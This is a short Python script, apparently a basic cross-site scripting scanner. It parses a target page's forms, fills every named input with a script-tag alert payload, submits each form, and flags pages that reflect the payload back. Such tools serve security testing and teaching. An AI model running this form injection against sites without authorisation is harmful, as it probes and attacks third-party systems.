# Enhancement: find forms with BeautifulSoup and inject payloads. 
# V2


import requests
from bs4 import BeautifulSoup
import sys

def get_forms(url):
    soup = BeautifulSoup(requests.get(url).text, 'html.parser')
    return soup.find_all('form')

def submit_form(form, url, payload):
    action = form.get('action')
    post_url = url + action if action else url
    method = form.get('method', 'get').lower()
    inputs = form.find_all('input')
    data = {}
    for inp in inputs:
        name = inp.get('name')
        if name:
            data[name] = payload
    if method == 'post':
        return requests.post(post_url, data=data)
    else:
        return requests.get(post_url, params=data)

def scan_xss(url):
    payload = "<script>alert('XSS')</script>"
    forms = get_forms(url)
    for form in forms:
        resp = submit_form(form, url, payload)
        if payload in resp.text:
            print(f"[!] XSS in {url} (action={form.get('action')})")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python webscan.py <url>")
        sys.exit(1)
    scan_xss(sys.argv[1])